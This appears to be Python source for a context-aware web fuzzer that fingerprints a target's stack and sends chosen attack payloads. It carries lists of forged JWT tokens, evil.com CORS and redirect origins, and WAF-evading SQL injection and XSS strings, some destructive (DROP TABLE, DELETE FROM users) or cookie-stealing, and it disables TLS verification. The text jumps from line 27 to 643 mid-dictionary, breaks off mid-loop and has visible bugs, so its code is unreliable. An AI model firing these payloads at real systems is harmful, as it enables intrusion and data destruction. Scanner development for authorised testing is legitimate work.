     1→"""
     2→ReconPro v7.5 — Context-Aware Payload Fuzzing Engine
     3→=====================================================
     4→Selects intelligent payloads based on the target's detected technology stack
     5→instead of blindly testing all payloads against every parameter.
     6→
     7→Zero external dependencies — uses only stdlib (urllib, re, dataclasses, etc.).
     8→"""
     9→
    10→from __future__ import annotations
    11→
    12→import re
    13→import time
    14→import json
    15→import urllib.parse
    16→import urllib.request
    17→import urllib.error
    18→from dataclasses import dataclass, field
    19→from typing import Optional
    20→
    21→
    22→# ──────────────────────────────────────────────────────────────────────────────
    23→# TECH_SIGNATURES — Clues for fingerprinting the target technology stack
    24→# ──────────────────────────────────────────────────────────────────────────────
    25→
    26→TECH_SIGNATURES: dict[str, dict[str, str | list[str]]] = {
    27→    "headers": {
   643→            '{"alg":"HS256","typ":"JWT"}.{"iss":"admin","sub":"1234567890","admin":true}',
   644→            '{"alg":"ES256","kty":"EC","crv":"P-256","x":"admin","y":"admin"}.eyJ1c2VyIjoiYWRtaW4ifQ.',
   645→            '{"alg":"HS256","typ":"JWT"}.eyJpYXQiOjk5OTk5OTk5OTl9.',
   646→            '{"typ":"JWT","alg":"none"}.eyJpZCI6MSwibmFtZSI6ImFkbWluIn0.',
   647→        ],
   648→    },
   649→
   650→    # ── CORS Exploitation ───────────────────────────────────────────────────
   651→    "cors": {
   652→        "generic": [
   653→            "https://evil.com",
   654→            "https://evil.com",
   655→            "null",
   656→            "https://evil.com.localhost",
   657→            "https://evil.com.127.0.0.1",
   658→            "https://evil.com.0.0.0.0",
   659→            "https://localhost.evil.com",
   660→            "https://evil.com:8080",
   661→            "https://127.0.0.1",
   662→            "https://evil.com%.target.com",
   663→            "https://evil.com%00.target.com",
   664→            "https://evil.com@target.com",
   665→            "https://target.com@evil.com",
   666→            "https://evil.com;.target.com",
   667→            "https://target.com.evil.com",
   668→        ],
   669→    },
   670→
   671→    # ── CSRF Token Bypass ───────────────────────────────────────────────────
   672→    "csrf": {
   673→        "generic": [
   674→            "DELETE",
   675→            "remove",
   676→            "",
   677→            "undefined",
   678→            "null",
   679→            "00000000000000000000000000000000",
   680→            "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
   681→            "test-token",
   682→            "1234567890",
   683→            "{\"token\":\"none\"}",
   684→        ],
   685→    },
   686→
   687→    # ── Open Redirect ────────────────────────────────────────────────────────
   688→    "open_redirect": {
   689→        "generic": [
   690→            "https://evil.com",
   691→            "//evil.com",
   692→            "https://evil.com%00.target.com",
   693→            "/\\evil.com",
   694→            "https://evil.com@target.com",
   695→            "https://target.com@evil.com",
   696→            "https://evil.com%2F%2Ftarget.com",
   697→            "https://evil.com%5Ctarget.com",
   698→            "https://evil.com%09target.com",
   699→            "/https:/evil.com",
   700→            "https:///evil.com",
   701→            "https://evil.com%0d%0atarget.com",
   702→            "https://evil.com%5c%5ctarget.com",
   703→            "//evil.com/%2f..",
   704→            "javascript:alert(1)",
   705→        ],
   706→    },
   707→
   708→    # ── WAF Bypass ──────────────────────────────────────────────────────────
   709→    "waf_bypass": {
   710→        "space2comment": [
   711→            "/**/UNION/**/SELECT/**/NULL,NULL,NULL--",
   712→            "UN/**/ION/**/SE/**/LECT/**/NULL,NULL,NULL",
   713→            "/**/OR/**/1=1--",
   714→            "SELECT/**/username/**/FROM/**/users",
   715→            "UNION/**/ALL/**/SELECT",
   716→            "/**/AND/**/1=1--",
   717→            "/**/AND/**/1=2--",
   718→            "SE/**/LECT/**/1,2,3/**/FROM/**/users",
   719→            "/**/ORDER/**/BY/**/1--",
   720→            "/**/GROUP/**/BY/**/1--",
   721→        ],
   722→        "case_alternation": [
   723→            "uNiOn SeLeCt NuLl,NuLl,NuLl--",
   724→            "UnIoN AlL SeLeCt",
   725→            "sElEcT UsErNaMe FrOm UsErS",
   726→            "AnD 1=1--",
   727→            "Or 1=1--",
   728→            "UnIoN sElEcT 1,2,3,4--",
   729→            "SeLeCt * FrOm InFoRmAtIoN_sChEmA.tAbLeS",
   730→            "dRoP TaBlE UsErS--",
   731→            "InSeRt InTo UsErS VaLuEs(1,'admin','pass')--",
   732→            "DeLeTe FrOm UsErS WhErE 1=1--",
   733→        ],
   734→        "unicode_normalization": [
   735→            "u\u0300nion select null,null,null--",
   736→            "\u0075nion \u0073elect null,null,null--",
   737→            "and\u00001=1--",
   738→            "sel\u0065ct * from users",
   739→            "uni\u00f3n s\u00e9lect null,null,null",
   740→            "UN\u00cfON SELE\u00c7T",
   741→            "and%u00201=1--",
   742→            "sel%u0065ct",
   743→            "un%u0069on",
   744→        ],
   745→        "double_encoding": [
   746→            "%2527 OR 1=1--",
   747→            "%2527%2520UNION%2520SELECT%2520NULL,NULL,NULL--",
   748→            "%252f%252f",
   749→            "%252e%252e%252f",
   750→            "%253Cscript%253Ealert(1)%253C/script%253E",
   751→            "%2527%2522%253E%253Csvg%252fonload=alert(1)%253E",
   752→            "%2522%255Ealert(1)%2522",
   753→            "%27%20OR%201%3D1--",
   754→            "%253Cimg%2520src%253Dx%2520onerror%253Dalert(1)%253E",
   755→            "%2522%253E%253Cscript%253Ealert(document.cookie)%253C/script%253E",
   756→        ],
   757→    },
   758→}
   759→
   760→
   761→# ──────────────────────────────────────────────────────────────────────────────
   762→# TECH_PROFILE — Data container for fingerprinting results
   763→# ──────────────────────────────────────────────────────────────────────────────
   764→
   765→@dataclass
   766→class TechProfile:
   767→    """Result of technology detection against a target."""
   768→    frameworks: list[str] = field(default_factory=list)
   769→    language: Optional[str] = None
   770→    server: Optional[str] = None
   771→    waf: Optional[str] = None
   772→    cms: Optional[str] = None
   773→    has_graphql: bool = False
   774→    has_rest_api: bool = False
   775→    confidence: float = 0.0
   776→
   777→    def to_dict(self) -> dict:
   778→        return {
   779→            "frameworks": self.frameworks,
   780→            "language": self.language,
   781→            "server": self.server,
   782→            "waf": self.waf,
   783→            "cms": self.cms,
   784→            "has_graphql": self.has_graphql,
   785→            "has_rest_api": self.has_rest_api,
   786→            "confidence": self.confidence,
   787→        }
   788→
   789→    def __repr__(self) -> str:
   790→        parts = []
   791→        if self.cms:
   792→            parts.append(f"cms={self.cms}")
   793→        if self.language:
   794→            parts.append(f"lang={self.language}")
   795→        if self.frameworks:
   796→            parts.append(f"fw={','.join(self.frameworks)}")
   797→        if self.server:
   798→            parts.append(f"srv={self.server}")
   799→        if self.waf:
   800→            parts.append(f"waf={self.waf}")
   801→        return f"TechProfile({', '.join(parts)}, confidence={self.confidence:.0%})"
   802→
   803→
   804→# ──────────────────────────────────────────────────────────────────────────────
   805→# TECH_DETECTOR — Fingerprinting engine
   806→# ──────────────────────────────────────────────────────────────────────────────
   807→
   808→class TechDetector:
   809→    """Analyzes HTTP responses, headers, HTML, and URLs to identify
   810→    the technology stack of a target application."""
   811→
   812→    def __init__(self) -> None:
   813→        self._reset()
   814→
   815→    def _reset(self) -> None:
   816→        self._frameworks: set[str] = set()
   817→        self._language: Optional[str] = None
   818→        self._server: Optional[str] = None
   819→        self._waf: Optional[str] = None
   820→        self._cms: Optional[str] = None
   821→        self._has_graphql: bool = False
   822→        self._has_rest_api: bool = False
   823→        self._confidence: float = 0.0
   824→        self._hits: int = 0
   825→
   826→    def analyze(
   827→        self,
   828→        target: str,
   829→        response_headers: dict[str, str],
   830→        html_body: str = "",
   831→        js_files: Optional[list[str]] = None,
   832→    ) -> TechProfile:
   833→        """Run full analysis and return a TechProfile."""
   834→        self._reset()
   835→        if js_files is None:
   836→            js_files = []
   837→
   838→        self._analyze_headers(response_headers)
   839→        self._analyze_html(html_body)
   840→        self._analyze_cookies(response_headers)
   841→        self._analyze_url(target)
   842→        self._analyze_js_files(js_files)
   843→        self._analyze_url_paths(target)
   844→
   845→        if self._hits > 0:
   846→            self._confidence = min(self._hits * 0.12, 1.0)
   847→
   848→        return TechProfile(
   849→            frameworks=list(self._frameworks),
   850→            language=self._language,
   851→            server=self._server,
   852→            waf=self._waf,
   853→            cms=self._cms,
   854→            has_graphql=self._has_graphql,
   855→            has_rest_api=self._has_rest_api,
   856→            confidence=self._confidence,
   857→        )
   858→
   859→    def _analyze_headers(self, headers: dict[str, str]) -> None:
   860→        header_signatures = TECH_SIGNATURES["headers"]
   861→        header_map = TECH_SIGNATURES["waf_signatures"]
   862→
   863→        for header_key, mapping in header_signatures.items():
   864→            header_val = headers.get(header_key, "")
   865→            if not isinstance(mapping, dict):
   866→                continue
   867→            for pattern, tech in mapping.items():
   868→                if isinstance(tech, str) and tech and pattern:
   869→                    if pattern.lower() in header_val.lower():
   870→                        if tech == "Drupal" or tech == "WordPress" or tech == "Joomla":
   871→                            self._cms = tech
   872→                            self._hits += 2
   873→                        elif tech in ("nginx", "Apache", "IIS", "Caddy", "LiteSpeed", "OpenResty"):
   874→                            self._server = tech
   875→                            self._hits += 1
   876→                        elif tech == "PHP":
   877→                            self._language = "PHP"
   878→                            self._hits += 1
   879→                        elif tech == "Python":
   880→                            self._language = "Python"
   881→                            self._hits += 1
   882→                        elif tech == "Java":
   883→                            self._language = "Java"
   884→                            self._hits += 1
   885→                        elif tech == "Ruby":
   886→                            self._language = "Ruby"
   887→                            self._hits += 1
   888→                        elif tech == "ASP.NET" or tech == "ASP.NET MVC" or tech == "ASP.NET Core":
   889→                            self._language = "ASP.NET"
   890→                            self._frameworks.add("ASP.NET")
   891→                            self._hits += 1
   892→                        elif tech in ("Express", "Django", "Flask", "Tornado", "Next.js", "React", "Vue", "Nuxt"):
   893→                            self._frameworks.add(tech)
   894→                            self._hits += 1
   895→                        elif tech == "Cloudflare":
   896→                            self._waf = "Cloudflare WAF"
   897→                            self._hits += 1
   898→                        else:
   899→                            self._frameworks.add(tech)
   900→                            self._hits += 1
   901→
   902→                if pattern == "" and mapping.get(header_key, "") == "" and header_val:
   903→                    tech_name = list(mapping.values())[0] if mapping else ""
   904→                    if tech_name and tech_name == "":
   905→                        tech_name = header_key.split("-")[-1].strip()
   906→                        self._hits += 1
   907→
   908→        for sig_header, waf_name in header_map.items():
   909→            if sig_header in headers:
   910→                self._waf = waf_name
   911→                self._hits += 1
   912→                break
   913→
   914→    def _analyze_html(self, html: str) -> None:
   915→        if not html:
   916→            return
   917→        html_lower = html.lower()
   918→
   919→        meta_signatures = TECH_SIGNATURES["html_meta"]
   920→        for meta_type, mapping in meta_signatures.items():
   921→            if meta_type == "generator":
   922→                match = re.search(
   923→                    r'<meta\s+[^>]*?name=["\']generator["\'][^>]*?content=["\']([^"\']+)["\']',
   924→                    html_lower,
   925→                    re.IGNORECASE,
   926→                )
   927→                if match:
   928→                    gen_value = match.group(1).strip().lower()
   929→                    for pattern, tech in mapping.items():
   930→                        if pattern.lower() in gen_value:
   931→                            if tech in ("WordPress", "Joomla", "Drupal", "Ghost", "vBulletin", "phpBB", "MediaWiki"):
   932→                                self._cms = tech
   933→                            else:
   934→                                self._frameworks.add(tech)
   935→                            self._hits += 2
   936→                            break
   937→
   938→            if meta_type == "viewport":
   939→                if 'name="viewport"' in html_lower or 'content="width=device-width' in html_lower:
   940→                    self._hits += 0.5
   941→
   942→        ext_signatures = TECH_SIGNATURES["file_extensions"]
   943→        for ext, lang in ext_signatures.items():
   944→            safe_ext = re.escape(ext)
   945→            pattern = rf'(?:src|href)=["\'][^"\']*{safe_ext}(?:\?[^"\']*)?["\']'
   946→            if re.search(pattern, html_lower):
   947→                if self._language is None:
   948→                    self._language = lang
   949→                self._hits += 1
   950→
   951→    def _analyze_cookies(self, headers: dict[str, str]) -> None:
   952→        cookie_header = headers.get("Set-Cookie", "") or headers.get("Cookie", "")
   953→        cookie_signatures = TECH_SIGNATURES["cookies"]
   954→
   955→        for cookie_name, lang in cookie_signatures.items():
   956→            if cookie_name.lower() in cookie_header.lower():
   957→                if lang == "PHP" and self._language is None:
   958→                    self._language = "PHP"
   959→                elif lang == "Java" and self._language is None:
   960→                    self._language = "Java"
   961→                elif lang == "ASP.NET" and self._language is None:
   962→                    self._language = "ASP.NET"
   963→                elif lang == "Rails" and self._language is None:
   964→                    self._language = "Ruby"
   965→                    self._frameworks.add("Rails")
   966→                elif lang == "Laravel":
   967→                    self._frameworks.add("Laravel")
   968→                elif lang == "CodeIgniter":
   969→                    self._frameworks.add("CodeIgniter")
   970→                elif lang == "Express":
   971→                    self._frameworks.add("Express")
   972→                elif lang == "Django":
   973→                    self._frameworks.add("Django")
   974→                elif lang == "Angular":
   975→                    self._frameworks.add("Angular")
   976→                elif lang == "Next.js":
   977→                    self._frameworks.add("Next.js")
   978→                self._hits += 1
   979→
   980→    def _analyze_url(self, target: str) -> None:
   981→        url_patterns = TECH_SIGNATURES["url_patterns"]
   982→        target_lower = target.lower()
   983→
   984→        for pattern, tech in url_patterns.items():
   985→            if pattern.lower() in target_lower:
   986→                if tech == "GraphQL":
   987→                    self._has_graphql = True
   988→                    self._frameworks.add("GraphQL")
   989→                elif tech == "REST API":
   990→                    self._has_rest_api = True
   991→                elif tech in ("WordPress", "Joomla", "Drupal"):
   992→                    self._cms = tech
   993→                elif tech == "Swagger/OpenAPI":
   994→                    self._has_rest_api = True
   995→                    self._frameworks.add("Swagger")
   996→                elif tech == "Spring Boot":
   997→                    self._frameworks.add("Spring Boot")
   998→                    self._language = "Java"
   999→                elif tech == "Django":
  1000→                    self._frameworks.add("Django")
  1001→                    self._language = "Python"
  1002→                elif tech == "Flask":
  1003→                    self._frameworks.add("Flask")
  1004→                    self._language = "Python"
  1005→                elif tech == "Dotenv":
  1006→                    self._hits += 1
  1007→                else:
  1008→                    self._frameworks.add(tech)
  1009→                self._hits += 1
  1010→
  1011→    def _analyze_js_files(self, js_files: list[str]) -> None:
  1012→        js_signatures = TECH_SIGNATURES["js_libraries"]
  1013→
  1014→        for js_path in js_files:
  1015→            js_lower = js_path.lower()
  1016→            for pattern, tech in js_signatures.items():
  1017→                if pattern.lower() in js_lower:
  1018→                    self._frameworks.add(tech)
  1019→                    self._hits += 1
  1020→                    break
  1021→
  1022→    def _analyze_url_paths(self, target: str) -> None:
  1023→        ext_signatures = TECH_SIGNATURES["file_extensions"]
  1024→        parsed = urllib.parse.urlparse(target)
  1025→        path = parsed.path.lower()
  1026→
  1027→        for ext, lang in ext_signatures.items():
  1028→            if path.endswith(ext):
  1029→                if self._language is None:
  1030→                    self._language = lang
  1031→                self._hits += 1
  1032→
  1033→
  1034→# ──────────────────────────────────────────────────────────────────────────────
  1035→# FUZZ_RESULT — Result of a single fuzz test
  1036→# ──────────────────────────────────────────────────────────────────────────────
  1037→
  1038→@dataclass
  1039→class FuzzResult:
  1040→    """Result of testing a single payload against a target parameter."""
  1041→    payload: str = ""
  1042→    category: str = ""
  1043→    classification: str = "none"
  1044→    matched_pattern: str = ""
  1045→    status_code: int = 0
  1046→    response_time: float = 0.0
  1047→    is_vulnerable: bool = False
  1048→    url: str = ""
  1049→    param: str = ""
  1050→
  1051→    def to_dict(self) -> dict:
  1052→        return {
  1053→            "payload": self.payload,
  1054→            "category": self.category,
  1055→            "classification": self.classification,
  1056→            "matched_pattern": self.matched_pattern,
  1057→            "status_code": self.status_code,
  1058→            "response_time": self.response_time,
  1059→            "is_vulnerable": self.is_vulnerable,
  1060→            "url": self.url,
  1061→            "param": self.param,
  1062→        }
  1063→
  1064→    def __repr__(self) -> str:
  1065→        status = "VULN" if self.is_vulnerable else "SAFE"
  1066→        return (
  1067→            f"FuzzResult({status} | {self.category} | {self.classification} | "
  1068→            f"status={self.status_code} | time={self.response_time:.3f}s | "
  1069→            f"payload={self.payload[:50]})"
  1070→        )
  1071→
  1072→
  1073→# ──────────────────────────────────────────────────────────────────────────────
  1074→# RESPONSE PATTERN DATABASE — Patterns used for response analysis
  1075→# ──────────────────────────────────────────────────────────────────────────────
  1076→
  1077→_SQL_ERROR_PATTERNS: list[re.Pattern] = [
  1078→    re.compile(r"you have an error in your sql syntax", re.IGNORECASE),
  1079→    re.compile(r"warning.*mysql", re.IGNORECASE),
  1080→    re.compile(r"unclosed quotation mark after the character string", re.IGNORECASE),
  1081→    re.compile(r"quoted string not properly terminated", re.IGNORECASE),
  1082→    re.compile(r"sql syntax.*mysql", re.IGNORECASE),
  1083→    re.compile(r"postgresql.*error", re.IGNORECASE),
  1084→    re.compile(r"psql.*error", re.IGNORECASE),
  1085→    re.compile(r"pg_query\(\)", re.IGNORECASE),
  1086→    re.compile(r"unterminated quoted string", re.IGNORECASE),
  1087→    re.compile(r"microsoft.*odbc.*sql server", re.IGNORECASE),
  1088→    re.compile(r"oledb.*sql server", re.IGNORECASE),
  1089→    re.compile(r"microsoft sql native client", re.IGNORECASE),
  1090→    re.compile(r"syntax error.*sqlite", re.IGNORECASE),
  1091→    re.compile(r"sqlite_busy", re.IGNORECASE),
  1092→    re.compile(r"ora-\d{5}", re.IGNORECASE),
  1093→    re.compile(r"oracle.*driver", re.IGNORECASE),
  1094→    re.compile(r"java\.sql\.sqlexception", re.IGNORECASE),
  1095→    re.compile(r"com\.mysql\.jdbc", re.IGNORECASE),
  1096→    re.compile(r"system\.data\.sqlclient", re.IGNORECASE),
  1097→    re.compile(r"sqlstate\[", re.IGNORECASE),
  1098→    re.compile(r"unclosed parenthesis", re.IGNORECASE),
  1099→    re.compile(r"syntax error near", re.IGNORECASE),
  1100→    re.compile(r"query failed", re.IGNORECASE),
  1101→    re.compile(r"sql query failed", re.IGNORECASE),
  1102→]
  1103→
  1104→_STACK_TRACE_PATTERNS: list[re.Pattern] = [
  1105→    re.compile(r"traceback \(most recent call last\)", re.IGNORECASE),
  1106→    re.compile(r"at \w+\.\w+\(.*\)", re.IGNORECASE),
  1107→    re.compile(r"exception in thread", re.IGNORECASE),
  1108→    re.compile(r"java\.lang\.\w+exception", re.IGNORECASE),
  1109→    re.compile(r"system\.nullreferenceexception", re.IGNORECASE),
  1110→    re.compile(r"fatal error", re.IGNORECASE),
  1111→    re.compile(r"unhandled exception", re.IGNORECASE),
  1112→    re.compile(r"NameError", re.IGNORECASE),
  1113→    re.compile(r"TypeError", re.IGNORECASE),
  1114→    re.compile(r"ValueError", re.IGNORECASE),
  1115→]
  1116→
  1117→_XSS_PATTERN: re.Pattern = re.compile(r"<script|onerror|onload|javascript:|alert\(|prompt\(|document\.cookie", re.IGNORECASE)
  1118→
  1119→_SSTI_PATTERN: re.Pattern = re.compile(r"(?:\{\{.*\}\}|\$\{.*\}|<%.*%>|%.*%)", re.IGNORECASE)
  1120→
  1121→_PATH_TRAVERSAL_PATTERN: re.Pattern = re.compile(r"root:.*:0:0:|daemon:|nobody:|www-data:|\\[Dd]rivers\\|\\[Ww]indows\\|boot\.ini", re.IGNORECASE)
  1122→
  1123→_CMD_INJECTION_PATTERN: re.Pattern = re.compile(r"uid=\d+.*gid=\d+|groups=\d+|drwx|total \d+|for 16-bit|OS Name:", re.IGNORECASE)
  1124→
  1125→
  1126→# ──────────────────────────────────────────────────────────────────────────────
  1127→# FUZZ_SESSION — Main fuzzing engine
  1128→# ──────────────────────────────────────────────────────────────────────────────
  1129→
  1130→class FuzzSession:
  1131→    """Context-aware fuzzing session that selects payloads based on the
  1132→    target's detected technology stack."""
  1133→
  1134→    def __init__(
  1135→        self,
  1136→        target: str,
  1137→        tech_profile: Optional[TechProfile] = None,
  1138→        timeout: float = 10.0,
  1139→        user_agent: str = "ReconPro/7.5 (Security Scanner)",
  1140→        verify_ssl: bool = False,
  1141→    ) -> None:
  1142→        self.target = target.rstrip("/")
  1143→        self.tech_profile = tech_profile
  1144→        self.timeout = timeout
  1145→        self.user_agent = user_agent
  1146→        self.verify_ssl = verify_ssl
  1147→        self.results: list[FuzzResult] = []
  1148→        self._base_time: float = 0.0
  1149→        self._baseline_status: int = 0
  1150→        self._opener = self._build_opener()
  1151→
  1152→    def _build_opener(self) -> urllib.request.OpenerDirector:
  1153→        """Build a URL opener with optional SSL bypass."""
  1154→        if not self.verify_ssl:
  1155→            import ssl
  1156→            ctx = ssl._create_unverified_context()
  1157→            https_handler = urllib.request.HTTPSHandler(context=ctx)
  1158→            return urllib.request.build_opener(https_handler)
  1159→        return urllib.request.build_opener()
  1160→
  1161→    def _make_request(
  1162→        self,
  1163→        url: str,
  1164→        params: Optional[dict[str, str]] = None,
  1165→        headers: Optional[dict[str, str]] = None,
  1166→        method: str = "GET",
  1167→    ) -> tuple[int, str, float, dict[str, str]]:
  1168→        """Make an HTTP request and return (status_code, body, time, headers)."""
  1169→        if params and method == "GET":
  1170→            query = urllib.parse.urlencode(params)
  1171→            url = f"{url}?{query}"
  1172→
  1173→        req_headers = {
  1174→            "User-Agent": self.user_agent,
  1175→            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
  1176→            "Accept-Language": "en-US,en;q=0.5",
  1177→        }
  1178→        if headers:
  1179→            req_headers.update(headers)
  1180→
  1181→        body_data: Optional[bytes] = None
  1182→        if params and method == "POST":
  1183→            body_data = urllib.parse.urlencode(params).encode("utf-8")
  1184→            req_headers["Content-Type"] = "application/x-www-form-urlencoded"
  1185→
  1186→        req = urllib.request.Request(url, data=body_data, headers=req_headers, method=method)
  1187→
  1188→        try:
  1189→            start = time.monotonic()
  1190→            resp = self._opener.open(req, timeout=self.timeout)
  1191→            elapsed = time.monotonic() - start
  1192→            resp_body = resp.read().decode("utf-8", errors="replace")
  1193→            resp_headers = dict(resp.headers)
  1194→            return resp.status, resp_body, elapsed, resp_headers
  1195→        except urllib.error.HTTPError as e:
  1196→            elapsed = time.monotonic() - time.monotonic() + 0.001
  1197→            try:
  1198→                resp_body = e.read().decode("utf-8", errors="replace")
  1199→            except Exception:
  1200→                resp_body = ""
  1201→            resp_headers = dict(e.headers) if hasattr(e, "headers") else {}
  1202→            return e.code, resp_body, elapsed, resp_headers
  1203→        except urllib.error.URLError:
  1204→            elapsed = 0.0
  1205→            return 0, "", elapsed, {}
  1206→        except Exception:
  1207→            elapsed = 0.0
  1208→            return 0, "", elapsed, {}
  1209→
  1210→    def calibrate(self) -> None:
  1211→        """Send a baseline request to establish normal response time and status."""
  1212→        status, _, elapsed, _ = self._make_request(self.target)
  1213→        self._baseline_status = status
  1214→        self._base_time = elapsed
  1215→
  1216→    def get_all_categories(self) -> list[str]:
  1217→        """Return a list of all available payload categories."""
  1218→        return list(PAYLOAD_DATABASE.keys())
  1219→
  1220→    def select_payloads(self, category: str) -> list[str]:
  1221→        """Select the most relevant payloads for the detected tech stack.
  1222→
  1223→        Priority logic:
  1224→          1. If tech_profile is available, prefer framework-specific payloads.
  1225→          2. Language-specific SQL payloads (e.g., Django -> postgres, WordPress -> mysql).
  1226→          3. Framework-specific template payloads (e.g., Django -> jinja2/django SSTI).
  1227→          4. CMS-specific extras for WordPress/Drupal/Joomla.
  1228→          5. Generic payloads always included as fallback.
  1229→        """
  1230→        if category not in PAYLOAD_DATABASE:
  1231→            return []
  1232→
  1233→        cat_payloads = PAYLOAD_DATABASE[category]
  1234→        selected: list[str] = []
  1235→        seen: set[str] = set()
  1236→
  1237→        def _add(payloads: list[str]) -> None:
  1238→            for p in payloads:
  1239→                if p not in seen:
  1240→                    selected.append(p)
  1241→                    seen.add(p)
  1242→
  1243→        # -- If we have a tech profile, prioritize matching payloads --------
  1244→        if self.tech_profile:
  1245→            tp = self.tech_profile
  1246→            fw_set = set(tp.frameworks)
  1247→            lang = tp.language
  1248→
  1249→            # --- SQL injection: route by detected language/backend ----------
  1250→            if category == "sqli":
  1251→                if any(fw in fw_set for fw in ("Django", "Flask", "Python", "FastAPI")):
  1252→                    if "postgres" in cat_payloads:
  1253→                        _add(cat_payloads["postgres"])
  1254→                if lang == "PHP" or tp.cms in ("WordPress", "Drupal", "Joomla"):
  1255→                    if "mysql" in cat_payloads:
  1256→                        _add(cat_payloads["mysql"])
  1257→                if lang == "Java" or any(fw in fw_set for fw in ("Spring Boot", "Tomcat", "Jetty")):
  1258→                    if "oracle" in cat_payloads:
  1259→                        _add(cat_payloads["oracle"])
  1260→                    if "mssql" in cat_payloads:
  1261→                        _add(cat_payloads["mssql"])
  1262→                if lang == "ASP.NET" or "ASP.NET" in fw_set:
  1263→                    if "mssql" in cat_payloads:
  1264→                        _add(cat_payloads["mssql"])
  1265→                if lang == "Ruby" or "Rails" in fw_set:
  1266→                    if "sqlite" in cat_payloads:
  1267→                        _add(cat_payloads["sqlite"])
  1268→                    if "postgres" in cat_payloads:
  1269→                        _add(cat_payloads["postgres"])
  1270→
  1271→            # --- XSS: route by detected frontend framework -----------------
  1272→            elif category == "xss":
  1273→                if "Angular" in fw_set:
  1274→                    _add(cat_payloads.get("angular", []))
  1275→                if "React" in fw_set:
  1276→                    _add(cat_payloads.get("react", []))
  1277→                if "Vue" in fw_set or "Nuxt" in fw_set:
  1278→                    _add(cat_payloads.get("vue", []))
  1279→                _add(cat_payloads.get("html", []))
  1280→
  1281→            # --- SSTI: route by detected backend template engine ------------
  1282→            elif category == "ssti":
  1283→                if any(fw in fw_set for fw in ("Django", "Python", "Flask", "FastAPI")):
  1284→                    _add(cat_payloads.get("jinja2", []))
  1285→                    _add(cat_payloads.get("django", []))
  1286→                if "Ruby" in fw_set or "Rails" in fw_set:
  1287→                    _add(cat_payloads.get("mako", []))
  1288→                if "PHP" in lang or tp.cms == "Drupal":
  1289→                    _add(cat_payloads.get("twig", []))
  1290→
  1291→            # --- SSRF: prefer cloud provider based on headers --------------
  1292→            elif category == "ssrf":
  1293→                if tp.server and "amazon" in tp.server.lower():
  1294→                    _add(cat_payloads.get("aws_metadata", []))
  1295→                elif tp.server and "google" in tp.server.lower():
  1296→                    _add(cat_payloads.get("gcp_metadata", []))
  1297→                elif "azure" in (tp.server or "").lower():
  1298→                    _add(cat_payloads.get("azure_metadata", []))
  1299→                else:
  1300→                    for sub in ("aws_metadata", "gcp_metadata", "azure_metadata"):
  1301→                        _add(cat_payloads.get(sub, []))
  1302→
  1303→            # --- Path traversal: OS-specific based on server ---------------
  1304→            elif category == "path_traversal":
  1305→                if tp.server and "iis" in tp.server.lower():
  1306→                    _add(cat_payloads.get("windows", []))
  1307→                else:
  1308→                    _add(cat_payloads.get("unix", []))
  1309→
  1310→            # --- Command injection: OS-specific based on server -------------
  1311→            elif category == "command_injection":
  1312→                if tp.server and "iis" in tp.server.lower():
  1313→                    _add(cat_payloads.get("windows", []))
  1314→                else:
  1315→                    _add(cat_payloads.get("unix", []))
  1316→
  1317→        # -- Always add generic payloads as fallback -------------------------
  1318→        if "generic" in cat_payloads:
  1319→            _add(cat_payloads["generic"])
  1320→
  1321→        # -- Add any remaining sub-categories not yet covered ---------------
  1322→        for sub_key, sub_payloads in cat_payloads.items():
  1323→            if sub_key != "generic" and sub_key not in ("mysql", "postgres", "mssql", "sqlite", "oracle",
  1324→                                                        "html", "angular", "react", "vue",
  1325→                                                        "jinja2", "django", "mako", "twig",
  1326→                                                        "aws_metadata", "gcp_metadata", "azure_metadata",
  1327→                                                        "unix", "windows"):
  1328→                if not self.tech_profile:
  1329→                    _add(sub_payloads)
  1330→
  1331→        return selected
  1332→
  1333→    def fuzz_parameter(
  1334→        self,
  1335→        url: str,
  1336→        param: str,
  1337→        payloads: Optional[list[str]] = None,
  1338→        category: str = "generic",
  1339→        method: str = "GET",
  1340→    ) -> list[FuzzResult]:
  1341→        """Fuzz a single URL parameter with selected payloads.
  1342→
  1343→        For each payload:
  1344→          1. Substitute the payload into the parameter value.
  1345→          2. Send the request.
  1346→          3. Analyze the response for anomalies.
  1347→          4. Return a list of FuzzResult objects.
  1348→        """
  1349→        if payloads is None:
  1350→            payloads = self.select_payloads(category)
  1351→
  1352→        if not payloads:
  1353→            return []
  1354→
  1355→        # Fetch the original (clean) response for comparison
  1356→        original_status, original_body, _, _ = self._make_request(url)
  1357→
  1358→        results: list[FuzzResult] = []
  1359→
  1360→        for payload in payloads:
  1361→            params = {param: payload}
